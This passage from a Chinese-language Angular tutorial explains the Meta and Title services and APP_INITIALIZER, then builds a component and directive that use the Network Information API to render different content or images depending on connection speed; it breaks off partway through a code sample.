关于 HTML meta 可以阅读 <a href="https://segmentfault.com/a/1190000004279791" target="_blank" rel="noopener noreferrer">HTML meta标签总结与属性使用介绍<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 这篇文章。</p> <p>Angular 为我们提供 Meta 服务。该服务支持以下的方法：</p> <ul><li>addTag   <code>this.meta.addTag({ name: 'description', content: 'Angular Meta Service' });</code></li> <li>addTags  <code>this.meta.addTags([ { name: 'description', content: 'Angular Meta Service' }, { name: 'keywords', content: 'Angular, RxJS, TypeScript' } ]);</code></li> <li>getTag  <code>let metaEl: HTMLMetaElement = this.meta.getTag('name=&quot;keywords&quot;');</code></li> <li>getTags  <code>let els: HTMLMetaElement[] = this.meta.getTags('name');</code></li> <li>updateTag  <code>this.meta.updateTag({ name: 'keywords', content: 'Node.js, Angular' });</code></li> <li>removeTag 该方法用于移除匹配 attrSelector 属性选择器的 HTML Meta 标签：<code>this.meta.removeTag('name=&quot;description&quot;');</code></li> <li>removeTagElement 该方法用于移除 meta 参数对应的 HTML Meta 标签： `let keywords: HTMLMetaElement = this.meta.getTag('name=&quot;keywords&quot;');</li></ul> <p>使用 Meta 服务，我们需要从 @angular/platform-browser 库导入 Meta 类，然后利用 Angular 依赖注入的机制，通过构造注入的方式注入 Meta 服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Meta <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
   providedIn<span class="token operator">:</span> <span class="token string">'root'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">MetaService</span> <span class="token punctuation">{</span> 
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> meta<span class="token operator">:</span> Meta</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>addTag()
addTag(tag: MetaDefinition, forceCreation: boolean = false): HTMLMetaElement | null</li></ul> <p>该方法用于在页面上添加一个 HTML Meta 标签，它接收两个参数：</p> <ul><li>tag：MetaDefinition 类型的对象</li> <li>forceCreation：是否强制创建，默认为 false</li></ul> <p>tag 参数对应的 MetaDefinition 类型定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> type MetaDefinition <span class="token operator">=</span> <span class="token punctuation">{</span>
  charset<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span> 
  content<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  httpEquiv<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span> 
  id<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span> 
  itemprop<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  name<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  property<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  scheme<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  url<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token operator">&amp;</span>
<span class="token punctuation">{</span>
  <span class="token comment">// TODO(IgorMinar): this type looks wrong</span>
  <span class="token punctuation">[</span>prop<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>我们来动手实践一下,其他以此类推</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">&quot;root&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">MetaService</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> meta<span class="token operator">:</span> Meta</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

  <span class="token function">addTag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>meta<span class="token punctuation">.</span><span class="token function">addTag</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'description'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'Angular Meta Service'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>meta<span class="token punctuation">.</span><span class="token function">addTag</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'keywords'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'Angular, RxJS, TypeScript'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="title"><a href="#title" class="header-anchor">#</a> Title</h3> <p>用于获取和设置当前 HTML 文档的标题。Title Service 提供了以下方法：</p> <ul><li>setTitle() <code>this.title.setTitle(&quot;xxx&quot;)</code></li> <li>getTitle()  <code>this.title.setTitle(&quot;xxx&quot;);</code></li></ul> <p>首先要使用 Title 服务，我们需要从 @angular/platform-browser 库导入 Title 类，然后利用 Angular 依赖注入的机制，通过构造注入的方式注入 Title 服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Title <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/platform-browser&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-root&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h3&gt;Angular Title Service&lt;/h3&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> title<span class="token operator">:</span> Title</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="app-initializer"><a href="#app-initializer" class="header-anchor">#</a> APP_INITIALIZER</h2> <p>有时需要在加载应用之前运行代码，有时希望暂停应用初始化，直到完成某些限制之后再执行。APP_INITIALIZER令牌可以完成这项操作。APP_INITIALIZER是一个函数，在应用改程序初始化时被调用。可以在AppModule类的providers中以factory的形式来配置。适合加载简单的数据或简单的校验。factory是一个返回值为promise的函数。
APP_INITIALIZER令牌定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">/**
 * A function that will be executed when an application is initialized.
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">APP_INITIALIZER</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token operator">&lt;</span>Array<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token string">'Application   Initializer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>APP_INITIALIZER Token 所对应的依赖对象是数组对象，数组中保存的元素是函数对象。这表示我们可以定义多个初始化逻辑,当我们定义的初始化函数执行后返回的是一个 Promise 对象时，它会被保存到 <code>asyncInitPromises: Promise&lt;any&gt;[]</code> 数组对象中，此后 Angular 会等待所有的异步任务都执行完成才认为初始化完成,具体使用如下：</p> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token punctuation">{</span>
  provide<span class="token operator">:</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">,</span>
  <span class="token function-variable function">useFactory</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  multi<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h2 id="网络连接状态组件"><a href="#网络连接状态组件" class="header-anchor">#</a> 网络连接状态组件</h2> <p>在开发 Web 应用程序时，有时候我们需要获取当前的网络状态，然后根据不同的网络状态显示不同的提示消息或显示不同页面内容。对于原生应用、混合应用或提供 JS-SDK 的第三方平台来说，我们可以通过相关的 Network API 来获取当前的网络连接状态。但对于 Web 应用来说，虽然也有相关的 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Network_Information_API" target="_blank" rel="noopener noreferrer">Network Information API<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>，但兼容性并不是太好，具体的兼容情况，可以参考 <a href="https://caniuse.com/netinfo" target="_blank" rel="noopener noreferrer">Can I Use - netinfo<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>。</p> <h3 id="network-information-api"><a href="#network-information-api" class="header-anchor">#</a> Network Information API</h3> <p>此 API 是由 WICG 编辑的草案，目前可在 Chrome 61+ 的版本中使用。开发者可以通过 navigator.connection 对象来访问与当前网络连接相关的属性：</p> <ul><li>connection.type：返回当前 User Agent 的物理网络类型，可能的值为 “cellular”，”ethernet”，”wfi” 或 “none” 等；</li> <li>connection.downlink：返回基于最近观察到的活动连接的有效带宽（以 Mb/s 为单位）；</li> <li>connection.rtt：返回基于最近观察到的活动连接估计平均往返时间（以毫秒为单位）；</li> <li>connection.saveData：如果用户在其浏览器启用 “reduced data mode” 模式，则返回 true；</li> <li>connection.effectiveType：返回有效的网络连接类型，可能的值为 slow-2g，2g，3g 或 4g。该值的是基于 rtt 和 downlink 的值测算出来的。</li></ul> <p>下面是网络连接类型的评估标准：</p> <table><thead><tr><th style="text-align:left;">CT</th> <th style="text-align:left;">Minimum RTT (ms)</th> <th style="text-align:left;">Maximum downlink (Kbps)</th> <th style="text-align:left;">Explanation</th></tr></thead> <tbody><tr><td style="text-align:left;">slow-2g</td> <td style="text-align:left;">2000</td> <td style="text-align:left;">50</td> <td style="text-align:left;">The network is suited for small transfers only such as text-only pages.</td></tr> <tr><td style="text-align:left;">2g</td> <td style="text-align:left;">1400</td> <td style="text-align:left;">70</td> <td style="text-align:left;">The network is suited for transfers of small images.</td></tr> <tr><td style="text-align:left;">3g</td> <td style="text-align:left;">270</td> <td style="text-align:left;">700</td> <td style="text-align:left;">The network is suited for transfers of large assets such as high resolution images, audio, and SD video.</td></tr> <tr><td style="text-align:left;">4g</td> <td style="text-align:left;">0</td> <td style="text-align:left;">∞</td> <td style="text-align:left;">The network is suited for HD video, real-time video, etc.</td></tr></tbody></table> <h3 id="开发网络连接组件"><a href="#开发网络连接组件" class="header-anchor">#</a> 开发网络连接组件</h3> <p>通过结合 Network Information API 与 Angular，我们可以创建一个组件，实现根据不同网络连接速度渲染不同的内容。比如，当我们检测到弱网络的时候，我们可以渲染一个占位符或一个低分辨率的图片或视频，从而提高页面的加载速度。</p> <p>首先，让我们把连接变化事件封装为一个 Observable 对象：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> connection$ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observable</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">observer</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> effectiveType <span class="token punctuation">}</span> <span class="token operator">=</span> navigator<span class="token punctuation">.</span>connection<span class="token punctuation">;</span>
  observer<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>effectiveType<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token function-variable function">onConnectionChange</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> effectiveType <span class="token punctuation">}</span> <span class="token operator">=</span> navigator<span class="token punctuation">.</span>connection<span class="token punctuation">;</span>
    observer<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>effectiveType<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  navigator<span class="token punctuation">.</span>connection<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">,</span> onConnectionChange<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    navigator<span class="token punctuation">.</span>connection<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">,</span> onConnectionChange<span class="token punctuation">)</span><span class="token punctuation">;</span>
    observer<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在页面初始化和连接网络状态发生变化的时候，可观察的 connection$ 对象将会自动通知我们当前的网络连接状态。</p> <p>接下来，我们来创建 ConnectionComponent 组件和相关的 Connection 指令：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// connection.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'connection'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-template [ngTemplateOutlet]=&quot;fast.tpl&quot; *ngIf=&quot;isFast&quot;&gt;&lt;/ng-template&gt;
    &lt;ng-template [ngTemplateOutlet]=&quot;slow.tpl&quot; *ngIf=&quot;!isFast&quot;&gt;&lt;/ng-template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ConnectionComponent</span> <span class="token punctuation">{</span>
  isFast <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  @<span class="token function">ContentChild</span><span class="token punctuation">(</span>FastDirective<span class="token punctuation">)</span> fast<span class="token operator">:</span> FastDirective<span class="token punctuation">;</span>
  @<span class="token function">ContentChild</span><span class="token punctuation">(</span>SlowDirective<span class="token punctuation">)</span> slow<span class="token operator">:</span> SlowDirective<span class="token punctuation">;</span>
  <span class="token keyword">private</span> subscription<span class="token operator">:</span> Subscription<span class="token punctuation">;</span>

  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> connection <span class="token operator">=</span> navigator<span class="token punctuation">.</span>connection<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>connection<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// if the browser doesn't support it, we render the fast template</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">this</span><span class="token punctuation">.</span>subscription <span class="token operator">=</span> connection$
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">effectiveType<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/slow-2g|2g|3g/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>effectiveType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>isFast <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>isFast <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>subscription <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subscription<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// fast.directive.ts</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[fast]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">FastDirective</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> tpl<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// slow.directive.ts</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[slow]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SlowDirective</span> <span class="token punctuation">{</span>
 <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> tpl<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br></div></div><p>在上面的示例中，ConnectionComponent 会根据 effectiveType 属性的值，然后显示 slow 或 fast 指令实例所关联的模板。现在我们来看一下如何使用：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>connection</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-container</span> <span class="token attr-name">*fast</span><span class="token punctuation">&gt;</span></span>
    Fast connection - Render a video
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-container</span><span class="token punctuation">&gt;</span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-container</span> <span class="token attr-name">*slow</span><span class="token punctuation">&gt;</span></span>
    Slow connection - Render a placeholder
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-container</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>connection</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>正如前面提到的，基于 Network Information API ，我们也可以实现一个简单的指令，根据不同的网络状态显示不同分辨率的图片。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">connection</span>
     <span class="token attr-name">slowSrc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://via.placeholder.com/350x150?text=slow<span class="token punctuation">&quot;</span></span> 
     <span class="token attr-name">fastSrc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://via.placeholder.com/350x150?text=fast<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>对应的 connection 指令的具体实现如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> Attribute<span class="token punctuation">,</span> ElementRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[connection]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ConnectionDirective</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>@<span class="token function">Attribute</span><span class="token punctuation">(</span><span class="token string">'slowSrc'</span><span class="token punctuation">)</span> <span class="token keyword">private</span> slowSrc<span class="token punctuation">,</span>
    @<span class="token function">Attribute</span><span class="token punctuation">(</span><span class="token string">'fastSrc'</span><span class="token punctuation">)</span> <span class="token keyword">private</span> fastSrc<span class="token punctuation">,</span>
    <span class="token keyword">private</span> host<span class="token operator">:</span> ElementRef<span class="token operator">&lt;</span>HTMLImageElement<span class="token operator">&gt;</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> effectiveType <span class="token punctuation">}</span> <span class="token operator">=</span> navigator<span class="token punctuation">.</span>connection<span class="token punctuation">;</span>
    <span class="token keyword">let</span> src<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/slow-2g|2g|3g/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>effectiveType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      src <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>slowSrc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      src <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fastSrc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
